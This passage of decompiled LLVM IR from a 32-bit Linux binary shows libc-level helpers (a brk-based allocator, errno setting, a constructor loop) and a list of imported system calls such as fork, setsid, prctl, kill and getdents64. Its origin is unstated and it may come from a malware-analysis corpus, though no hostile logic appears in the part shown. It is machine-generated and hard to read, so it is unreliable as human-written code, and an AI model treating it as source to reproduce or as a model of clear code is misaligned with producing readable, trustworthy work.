  br i1 %v7_8053cd0, label %dec_label_pc_8053cd2, label %dec_label_pc_8053c7b

dec_label_pc_8053cd2:                             ; preds = %dec_label_pc_8053cc4
  %v4_8053cd7 = icmp eq i32 %arg2, 0
  br i1 %v4_8053cd7, label %dec_label_pc_8053cef, label %dec_label_pc_8053cde

dec_label_pc_8053cde:                             ; preds = %dec_label_pc_8053cd2
  %v1_8053ce2 = call i32 @llvm.bswap.i32(i32 %v2_8053cca)
  %v2_8053ce4 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8053ce2, i32* %v2_8053ce4, align 4
  br label %dec_label_pc_8053cef

dec_label_pc_8053ced:                             ; preds = %dec_label_pc_8053cbb, %dec_label_pc_8053cb3, %dec_label_pc_8053c7b, %dec_label_pc_8053c8f, %dec_label_pc_8053c61
  br label %dec_label_pc_8053cef

dec_label_pc_8053cef:                             ; preds = %dec_label_pc_8053cd2, %dec_label_pc_8053cde, %dec_label_pc_8053ced
  %v0_8053cf4 = phi i32 [ 1, %dec_label_pc_8053cd2 ], [ 1, %dec_label_pc_8053cde ], [ 0, %dec_label_pc_8053ced ]
  ret i32 %v0_8053cf4

; uselistorder directives
  uselistorder i32 %v2_8053ca1, { 1, 0 }
  uselistorder i32 %v6_8053c9f, { 1, 0 }
  uselistorder i32 %v1_8053c9e, { 0, 2, 1 }
  uselistorder i32 %v1_8053c96, { 1, 0 }
  uselistorder i32 %v3_8053c92, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8053cc7, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 %v0_8053c7e.pre, { 1, 0, 2 }
  uselistorder i32 256, { 1, 18, 20, 19, 2, 0, 3, 4, 5, 21, 16, 7, 6, 8, 9, 17, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 46, { 1, 0, 2, 3, 4 }
  uselistorder i32 3, { 1, 2, 0, 12, 10, 13, 6, 7, 9, 3, 16, 17, 18, 19, 20, 21, 22, 11, 4, 8, 14, 15, 5 }
  uselistorder i32 10, { 0, 5, 4, 2, 6, 1, 11, 8, 9, 10, 3, 12, 7 }
  uselistorder i16 0, { 0, 2, 1, 6, 7, 8, 9, 5, 3, 4 }
  uselistorder i16 8, { 1, 0 }
  uselistorder i32 -256, { 9, 1, 5, 6, 51, 10, 11, 4, 7, 38, 33, 34, 8, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 36, 37, 39, 40, 41, 42, 0, 43, 44, 45, 46, 47, 48, 49, 50, 12, 13, 14, 15, 16, 17, 18, 19, 2, 3, 20, 21, 52 }
  uselistorder i8 0, { 30, 31, 207, 206, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 22, 42, 29, 55, 2, 43, 44, 59, 60, 61, 62, 64, 65, 66, 67, 68, 45, 69, 70, 53, 54, 52, 71, 72, 0, 73, 74, 75, 76, 77, 78, 79, 3, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 4, 5, 90, 91, 92, 93, 58, 94, 57, 95, 56, 96, 97, 98, 99, 100, 101, 6, 102, 103, 104, 105, 7, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 8, 116, 9, 15, 10, 117, 118, 11, 119, 120, 121, 12, 122, 16, 13, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 14, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 63, 184, 1, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 17, 47, 49, 46, 20, 48, 21, 50, 51, 18, 19, 28, 23, 24, 25, 26, 27 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 2, { 35, 37, 11, 38, 1, 69, 13, 70, 14, 33, 0, 20, 30, 21, 31, 22, 32, 2, 3, 4, 39, 5, 6, 7, 15, 16, 40, 8, 9, 18, 10, 23, 17, 19, 26, 24, 25, 41, 42, 43, 44, 50, 51, 36, 56, 52, 53, 58, 59, 60, 61, 62, 63, 54, 55, 57, 64, 65, 34, 66, 28, 27, 45, 46, 47, 48, 49, 29, 12, 67, 68 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8053cef, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053ced, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8053c8f, { 1, 0 }
  uselistorder label %dec_label_pc_8053c7b, { 1, 0 }
}

define i32 @function_8053cf5(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053cf5:
  %v0_8053cf8 = call i32 @function_8051537()
  %v0_8053cfd = load i32, i32* @edx, align 4
  %v4_8053d04 = call i32 @function_80515c2(i32 %v0_8053cf8, i32 %arg1, i32 %v0_8053cfd, i32 %v0_8053cfd)
  ret i32 %v4_8053d04

; uselistorder directives
  uselistorder i32* @edx, { 122, 20, 0, 2, 21, 22, 23, 1, 14, 15, 17, 13, 118, 24, 124, 125, 129, 128, 27, 28, 3, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 4, 42, 43, 25, 26, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 5, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 6, 100, 101, 102, 103, 104, 105, 106, 127, 16, 18, 19, 126, 121, 123, 107, 7, 115, 116, 117, 9, 10, 112, 113, 8, 114, 119, 11, 120, 108, 109, 110, 111, 12, 130 }
}

define i32 @function_8053d0d() local_unnamed_addr {
dec_label_pc_8053d0d:
  %v0_8053d0d = load i32, i32* @eax, align 4
  %v1_8053d0d = add i32 %v0_8053d0d, 28
  %v2_8053d0d = inttoptr i32 %v1_8053d0d to i32*
  %v3_8053d0d = load i32, i32* %v2_8053d0d, align 4
  store i32 %v3_8053d0d, i32* @global_var_8055c38.73, align 8
  %v1_8053d16 = add i32 %v0_8053d0d, 44
  %v2_8053d16 = inttoptr i32 %v1_8053d16 to i32*
  %v3_8053d16 = load i32, i32* %v2_8053d16, align 4
  store i32 %v3_8053d16, i32* @global_var_8055c3c.74, align 4
  ret i32 %v3_8053d16

; uselistorder directives
  uselistorder i32 44, { 12, 2, 1, 6, 8, 7, 3, 4, 5, 9, 10, 11, 0 }
  uselistorder i32 28, { 22, 10, 11, 9, 13, 14, 15, 6, 7, 8, 1, 4, 5, 12, 16, 17, 3, 2, 18, 19, 21, 20, 0 }
}

define i32 @function_8053d1f(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053d1f:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053d1f = load i32, i32* @ebx, align 4
  store i32 %v0_8053d1f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8053d32 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8053d32, i32* @global_var_80556f8.71, align 8
  %v7_8053d3d = icmp ult i32 %v1_8053d32, %arg1
  %v1_8053d3f = icmp eq i1 %v7_8053d3d, false
  br i1 %v1_8053d3f, label %dec_label_pc_8053d4f, label %dec_label_pc_8053d41

dec_label_pc_8053d41:                             ; preds = %dec_label_pc_8053d1f
  %v1_8053d41 = call i32 @function_8051a1b(i32 %v0_8053d1f)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8053d49 = inttoptr i32 %v1_8053d41 to i32*
  store i32 12, i32* %v1_8053d49, align 4
  %v0_8053d4f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053d53.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053d4f

dec_label_pc_8053d4f:                             ; preds = %dec_label_pc_8053d1f, %dec_label_pc_8053d41
  %v2_8053d53 = phi i32 [ %v0_8053d1f, %dec_label_pc_8053d1f ], [ %v2_8053d53.pre, %dec_label_pc_8053d41 ]
  %v0_8053d4f = phi i32 [ 0, %dec_label_pc_8053d1f ], [ %v0_8053d4f.pre, %dec_label_pc_8053d41 ]
  store i32 %v2_8053d53, i32* @ebx, align 4
  ret i32 %v0_8053d4f

; uselistorder directives
  uselistorder i32 %v1_8053d32, { 1, 0 }
  uselistorder i32 12, { 23, 17, 18, 12, 13, 14, 11, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 63, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 8, 62, 9, 15, 16, 19, 20, 21, 64, 65, 88, 76, 66, 22, 2, 72, 68, 69, 77, 67, 70, 71, 73, 74, 1, 75, 78, 79, 7, 80, 81, 82, 83, 85, 86, 10, 84, 3, 4, 5, 6, 87, 0 }
  uselistorder i32* @global_var_80556f8.71, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053d4f, { 1, 0 }
}

define i32 @function_8053d55() local_unnamed_addr {
dec_label_pc_8053d55:
  %v0_8053d58 = load i32, i32* @eax, align 4
  %v1_8053d5a = sub i32 0, %v0_8053d58
  %v1_8053d5c = call i32 @function_8051a1b(i32 ptrtoint (i32* @0 to i32))
  %v2_8053d61 = inttoptr i32 %v1_8053d5c to i32*
  store i32 %v1_8053d5a, i32* %v2_8053d61, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_8051a1b, { 33, 32, 47, 14, 31, 30, 46, 13, 50, 12, 6, 11, 45, 44, 23, 51, 10, 0, 7, 29, 9, 8, 28, 25, 27, 26, 49, 48, 22, 21, 43, 42, 41, 20, 5, 4, 40, 19, 39, 38, 37, 3, 16, 36, 35, 15, 24, 18, 2, 1, 34, 17 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 8, 22, 9, 10, 11, 23, 24, 25, 26, 7, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
}

define i32 @function_8053d70() local_unnamed_addr {
dec_label_pc_8053d70:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8053d7c = load i32, i32* @global_var_80555a4.58, align 4
  %v10_8053d81 = icmp eq i32 %v0_8053d7c, -1
  br i1 %v10_8053d81, label %dec_label_pc_8053d92, label %dec_label_pc_8053d86.preheader

dec_label_pc_8053d86.preheader:                   ; preds = %dec_label_pc_8053d70
  br label %dec_label_pc_8053d86

dec_label_pc_8053d86:                             ; preds = %dec_label_pc_8053d86.preheader, %dec_label_pc_8053d86
  %v4_8053d89 = phi i32 [ %v0_8053d7c, %dec_label_pc_8053d86.preheader ], [ %v2_8053d8b, %dec_label_pc_8053d86 ]
  %v0_8053d86 = phi i32 [ ptrtoint (i32* @global_var_80555a4.58 to i32), %dec_label_pc_8053d86.preheader ], [ %v1_8053d86, %dec_label_pc_8053d86 ]
  %v1_8053d86 = add i32 %v0_8053d86, -4
  call void @__pseudo_call(i32 %v4_8053d89)
  %v1_8053d8b = inttoptr i32 %v1_8053d86 to i32*
  %v2_8053d8b = load i32, i32* %v1_8053d8b, align 4
  %v10_8053d8d = icmp eq i32 %v2_8053d8b, -1
  %v1_8053d90 = icmp eq i1 %v10_8053d8d, false
  br i1 %v1_8053d90, label %dec_label_pc_8053d86, label %dec_label_pc_8053d92.loopexit

dec_label_pc_8053d92.loopexit:                    ; preds = %dec_label_pc_8053d86
  %v2_8053d92.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8053d92

dec_label_pc_8053d92:                             ; preds = %dec_label_pc_8053d92.loopexit, %dec_label_pc_8053d70
  %v2_8053d92 = phi i32 [ %v2_8053d92.pre, %dec_label_pc_8053d92.loopexit ], [ %tmp6, %dec_label_pc_8053d70 ]
  ret i32 %v2_8053d92

; uselistorder directives
  uselistorder i32 %v0_8053d7c, { 1, 0 }
  uselistorder i1 false, { 194, 59, 60, 61, 63, 62, 1, 64, 65, 66, 51, 52, 211, 212, 213, 214, 216, 30, 217, 218, 215, 210, 195, 47, 196, 197, 198, 3, 200, 201, 2, 202, 203, 204, 205, 5, 206, 207, 208, 209, 4, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 67, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 8, 93, 94, 28, 96, 95, 99, 97, 98, 9, 31, 100, 101, 199, 48, 6, 49, 50, 127, 128, 33, 53, 54, 55, 116, 117, 129, 7, 102, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 14, 140, 141, 142, 15, 143, 16, 103, 144, 145, 122, 36, 56, 57, 146, 123, 124, 125, 58, 112, 113, 114, 17, 18, 115, 34, 118, 119, 35, 120, 121, 19, 126, 147, 148, 149, 150, 38, 193, 151, 37, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 166, 39, 167, 168, 20, 27, 21, 26, 10, 169, 40, 170, 171, 172, 173, 41, 11, 42, 43, 22, 12, 13, 174, 0, 175, 176, 177, 44, 25, 23, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 29, 190, 191, 192, 104, 105, 106, 107, 108, 109, 110, 45, 111, 24, 163, 164, 165, 219, 46, 32, 220 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 8, 9, 10, 11, 44, 45, 46, 47, 4, 48, 1, 43, 12, 49, 5, 50, 51, 52, 6, 0, 2, 3, 53, 54, 55, 56, 57, 58, 59, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 ptrtoint (i32* @global_var_80555a4.58 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 26, 27, 0, 91, 175, 54, 92, 18, 55, 93, 56, 94, 57, 95, 58, 96, 59, 97, 60, 98, 61, 99, 62, 100, 63, 101, 19, 20, 7, 6, 64, 65, 102, 66, 103, 67, 104, 28, 1, 105, 53, 68, 69, 106, 107, 108, 9, 109, 8, 110, 176, 11, 12, 111, 10, 112, 29, 162, 30, 113, 163, 32, 33, 21, 16, 34, 70, 35, 114, 31, 164, 4, 115, 116, 22, 23, 24, 117, 13, 15, 36, 2, 71, 159, 160, 170, 171, 72, 161, 37, 73, 118, 74, 119, 75, 120, 51, 52, 121, 76, 122, 77, 123, 78, 124, 79, 125, 80, 126, 81, 127, 82, 128, 83, 129, 84, 130, 85, 131, 86, 132, 87, 133, 88, 134, 89, 135, 38, 169, 5, 14, 172, 165, 166, 42, 136, 41, 50, 137, 173, 39, 138, 139, 167, 168, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 40, 48, 151, 49, 152, 153, 154, 43, 174, 155, 156, 3, 17, 44, 45, 25, 46, 47, 157, 158, 90 }
  uselistorder i32 1, { 184, 185, 29, 115, 116, 298, 0, 299, 117, 402, 186, 4, 3, 5, 187, 13, 12, 11, 188, 36, 189, 190, 45, 192, 191, 46, 194, 193, 14, 195, 44, 196, 95, 197, 21, 198, 72, 199, 71, 200, 96, 201, 202, 48, 47, 49, 135, 56, 204, 203, 206, 205, 58, 207, 59, 209, 208, 43, 210, 214, 213, 212, 211, 60, 403, 404, 405, 217, 216, 215, 34, 35, 33, 118, 218, 220, 219, 69, 119, 177, 291, 112, 226, 225, 224, 223, 222, 221, 93, 94, 136, 227, 178, 230, 229, 228, 92, 137, 301, 302, 303, 231, 37, 304, 305, 120, 306, 307, 308, 17, 15, 16, 110, 300, 138, 78, 79, 80, 81, 139, 121, 309, 310, 311, 312, 234, 233, 232, 98, 97, 99, 140, 235, 19, 20, 142, 313, 314, 315, 316, 317, 318, 319, 320, 321, 141, 322, 323, 324, 325, 326, 122, 327, 328, 101, 123, 329, 330, 331, 332, 124, 125, 333, 334, 335, 238, 237, 236, 39, 38, 40, 42, 41, 126, 127, 239, 128, 129, 243, 242, 241, 240, 30, 143, 179, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 294, 295, 256, 10, 9, 8, 257, 258, 144, 145, 259, 260, 130, 262, 261, 32, 146, 263, 264, 22, 265, 18, 266, 74, 267, 25, 268, 62, 269, 70, 270, 6, 271, 7, 272, 61, 57, 274, 273, 28, 275, 24, 276, 77, 278, 277, 100, 279, 68, 280, 50, 281, 23, 31, 283, 282, 76, 377, 131, 378, 379, 111, 385, 104, 27, 26, 336, 380, 182, 87, 89, 88, 91, 90, 381, 183, 82, 84, 83, 86, 85, 73, 337, 338, 339, 340, 363, 364, 162, 163, 150, 296, 297, 152, 375, 376, 158, 367, 368, 160, 369, 370, 386, 151, 365, 366, 159, 161, 156, 371, 372, 157, 154, 373, 374, 155, 153, 148, 382, 383, 149, 147, 384, 387, 164, 388, 165, 389, 391, 401, 390, 392, 393, 394, 395, 396, 397, 399, 166, 400, 292, 109, 293, 52, 55, 53, 51, 54, 398, 180, 284, 75, 341, 342, 343, 344, 172, 171, 108, 102, 345, 346, 132, 106, 107, 103, 347, 348, 133, 105, 173, 349, 350, 181, 351, 352, 353, 168, 169, 354, 355, 170, 175, 174, 356, 357, 358, 167, 359, 360, 361, 134, 362, 287, 286, 285, 64, 65, 66, 63, 67, 288, 1, 176, 2, 113, 114, 406, 290, 289 }
  uselistorder label %dec_label_pc_8053d86, { 1, 0 }
}

define i32 @function_8053d96() local_unnamed_addr {
entry:
  %v0_8053d99 = load i32, i32* @ebx, align 4
  %v1_8053d9a = call i32 @function_80480b0(i32 %v0_8053d99)
  store i32 %v1_8053d9a, i32* @eax, align 4
  %v0_8053da5 = call i32 @function_80480c0()
  ret i32 %v0_8053da5

; uselistorder directives
  uselistorder i32* @eax, { 7, 12, 36, 38, 39, 40, 41, 43, 9, 44, 0, 42, 4, 6, 37, 13, 15, 16, 14, 17, 18, 19, 25, 20, 21, 23, 24, 22, 1, 10, 11, 8, 2, 28, 27, 29, 33, 30, 31, 32, 26, 45, 34, 35, 3, 5 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 255, 44, 173, 45, 256, 257, 5, 258, 259, 260, 6, 46, 81, 82, 232, 233, 47, 225, 261, 262, 263, 97, 264, 407, 265, 266, 226, 227, 408, 216, 215, 409, 410, 411, 217, 228, 229, 234, 235, 213, 412, 349, 27, 28, 413, 83, 431, 432, 7, 48, 174, 8, 175, 176, 442, 443, 77, 444, 49, 159, 50, 98, 99, 0, 414, 415, 416, 51, 214, 168, 52, 177, 417, 1, 84, 85, 53, 418, 419, 54, 55, 421, 420, 14, 15, 422, 425, 100, 160, 426, 428, 427, 12, 13, 429, 430, 56, 433, 18, 161, 57, 86, 435, 438, 437, 16, 17, 269, 270, 271, 272, 273, 87, 274, 275, 276, 29, 30, 31, 32, 267, 101, 268, 102, 178, 277, 41, 278, 88, 179, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 89, 90, 290, 180, 302, 181, 182, 103, 162, 183, 104, 163, 58, 184, 291, 292, 59, 60, 105, 164, 43, 293, 294, 295, 61, 62, 106, 165, 42, 296, 78, 297, 39, 298, 299, 301, 185, 300, 2, 436, 423, 424, 218, 219, 221, 220, 19, 20, 3, 91, 222, 223, 224, 303, 230, 231, 186, 187, 236, 237, 238, 239, 240, 241, 242, 243, 188, 244, 245, 350, 434, 246, 351, 247, 248, 249, 439, 92, 405, 250, 251, 406, 304, 352, 440, 441, 63, 64, 252, 66, 65, 67, 189, 353, 40, 9, 68, 190, 69, 191, 337, 305, 192, 193, 306, 309, 194, 93, 322, 323, 402, 354, 355, 33, 195, 324, 196, 253, 335, 327, 329, 356, 357, 340, 346, 347, 254, 341, 342, 343, 325, 326, 328, 330, 331, 332, 333, 334, 336, 197, 338, 339, 344, 345, 21, 22, 348, 70, 198, 358, 71, 199, 359, 360, 362, 72, 399, 400, 401, 79, 361, 200, 363, 364, 365, 366, 367, 368, 369, 370, 371, 377, 169, 372, 373, 374, 375, 376, 378, 201, 202, 73, 203, 380, 381, 382, 383, 384, 94, 34, 385, 386, 387, 204, 388, 389, 390, 394, 395, 396, 397, 398, 35, 95, 379, 74, 166, 205, 206, 170, 171, 310, 311, 26, 24, 207, 25, 23, 208, 312, 313, 314, 36, 315, 316, 317, 96, 209, 318, 319, 320, 321, 167, 210, 211, 307, 308, 37, 391, 392, 393, 10, 38, 172, 11, 75, 4, 403, 404, 76, 212, 80, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 445, 446, 447, 448, 449, 450, 451, 452 }
  uselistorder i32* @ebx, { 31, 93, 94, 62, 63, 36, 95, 5, 96, 97, 369, 98, 99, 100, 370, 33, 371, 372, 373, 374, 375, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 64, 6, 65, 66, 67, 32, 376, 377, 215, 216, 101, 102, 378, 379, 380, 29, 30, 406, 407, 408, 409, 27, 7, 26, 391, 400, 404, 405, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 396, 397, 103, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 8, 118, 119, 104, 105, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 9, 132, 133, 134, 135, 136, 137, 138, 139, 165, 166, 167, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 28, 150, 151, 152, 153, 154, 10, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 394, 395, 34, 35, 55, 56, 57, 58, 59, 60, 61, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 217, 218, 392, 393, 86, 219, 220, 87, 88, 89, 398, 399, 365, 366, 90, 91, 367, 368, 168, 169, 221, 222, 401, 402, 403, 92, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 174, 175, 254, 255, 256, 257, 204, 195, 200, 196, 197, 205, 206, 207, 208, 198, 199, 201, 202, 203, 209, 210, 211, 212, 213, 214, 258, 259, 260, 261, 262, 11, 263, 264, 265, 267, 266, 277, 278, 279, 12, 280, 281, 282, 283, 284, 0, 285, 1, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 2, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 13, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 14, 326, 327, 328, 329, 3, 330, 331, 15, 332, 333, 16, 334, 335, 336, 337, 17, 338, 339, 4, 340, 341, 342, 343, 344, 345, 346, 347, 348, 18, 349, 350, 19, 351, 20, 352, 353, 354, 355, 356, 21, 22, 23, 357, 358, 24, 359, 360, 268, 269, 270, 271, 272, 273, 274, 275, 276, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 25, 193, 194, 170, 171, 172, 173, 361, 362, 363, 364 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i64 @__decompiler_undefined_function_4() local_unnamed_addr

declare i8* @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
